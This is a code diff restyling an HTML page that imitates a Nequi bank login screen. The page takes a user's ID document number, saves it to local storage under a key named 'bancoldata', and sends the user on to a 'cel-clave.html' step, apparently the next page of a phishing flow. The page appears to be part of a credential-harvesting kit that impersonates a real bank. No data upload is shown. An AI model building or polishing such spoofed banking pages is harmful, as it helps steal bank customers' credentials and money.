@@ -9,156 +9,133 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #210049;
-      color: white;
+      background: #2b002b;
       display: flex;
       justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: white;
     }
 
     .container {
-      max-width: 420px;
       width: 100%;
-      min-height: 100vh;
+      max-width: 400px;
+      padding: 20px;
       display: flex;
       flex-direction: column;
-      padding: 20px;
-    }
-
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
+      height: 100vh;
     }
 
     .logo {
+      margin-top: auto;
       text-align: center;
-      margin: 40px 0;
-      font-size: 28px;
+      font-size: 48px;
       font-weight: bold;
+    }
+
+    .logo span {
       color: #ff008c;
     }
 
-    .form-box {
+    .form {
       margin-top: auto;
     }
 
-    .input-container {
-      background: rgba(255,255,255,0.15);
-      border-radius: 6px;
-      padding: 10px;
+    .input-box {
+      background: rgba(255,255,255,0.2);
+      border-radius: 8px;
+      padding: 12px;
       display: flex;
       align-items: center;
     }
 
-    input {
+    .input-box input {
       width: 100%;
       border: none;
       outline: none;
       background: transparent;
       color: white;
       font-size: 16px;
-      padding: 10px;
     }
 
-    input::placeholder {
+    .input-box input::placeholder {
       color: #ddd;
     }
 
-    .checkbox {
-      margin-top: 10px;
-      font-size: 14px;
-    }
-
-    button {
+    .btn {
+      margin-top: 15px;
       width: 100%;
-      margin-top: 20px;
-      height: 45px;
+      padding: 14px;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       background: #ff008c;
       color: white;
       font-size: 16px;
       cursor: pointer;
+      opacity: 0.6;
     }
 
-    button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
+    .btn.active {
+      opacity: 1;
     }
   </style>
 </head>
 
 <body>
 
-  <div class="container">
+<div class="container">
 
-    <div class="header">
-      <div>❓</div>
-      <div style="opacity:0.5;">Nequi</div>
-    </div>
-
-    <div class="logo">NEQUI</div>
-
-    <div class="form-box">
-      <form id="form">
-
-        <div class="input-container">
-          <input type="number" id="userInput" placeholder="Ingresa tu documento">
-        </div>
-
-        <div class="checkbox">
-          <input type="checkbox" id="rememberDoc">
-          Recordar número
-        </div>
-
-        <button id="continueButton" disabled>Continuar</button>
-
-      </form>
-    </div>
-
+  <div class="logo">
+    <span>•</span>Nequi
   </div>
 
-  <script>
-    const userInput = document.getElementById('userInput');
-    const continueButton = document.getElementById('continueButton');
-    const form = document.getElementById('form');
+  <div class="form">
+    <div class="input-box">
+      <input type="number" id="docInput" placeholder="Ingresa tu documento">
+    </div>
 
-    function validar() {
-      const val = userInput.value.trim();
-      continueButton.disabled = val.length < 4;
-    }
+    <button class="btn" id="btn">Entra</button>
+  </div>
 
-    userInput.addEventListener('input', validar);
+</div>
 
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
+<script>
+const input = document.getElementById("docInput");
+const btn = document.getElementById("btn");
 
-      const userValue = userInput.value.trim();
+// activar botón
+input.addEventListener("input", () => {
+  if (input.value.length >= 4) {
+    btn.classList.add("active");
+  } else {
+    btn.classList.remove("active");
+  }
+});
 
-      if (userValue.length >= 4) {
-        let data = {};
+// click
+btn.addEventListener("click", () => {
+  const value = input.value.trim();
 
-        try {
-          data = JSON.parse(localStorage.getItem('bancoldata')) || {};
-        } catch (e) {
-          data = {};
-        }
+  if (value.length < 4) {
+    alert("Ingrese mínimo 4 dígitos");
+    return;
+  }
 
-        data.usuario = userValue;
-        data.fecha = new Date().toISOString();
+  let data = {};
+  try {
+    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
+  } catch {
+    data = {};
+  }
 
-        if (document.getElementById('rememberDoc').checked) {
-          data.rememberDocument = true;
-        }
+  data.usuario = value;
+  data.fecha = new Date().toISOString();
 
-        localStorage.setItem('bancoldata', JSON.stringify(data));
+  localStorage.setItem("bancoldata", JSON.stringify(data));
 
-        window.location.href = 'cel-clave.html';
-      } else {
-        alert('Ingrese mínimo 4 dígitos');
-      }
-    });
-  </script>
+  window.location.href = "cel-clave.html";
+});
+</script>
 
 </body>
 </html>
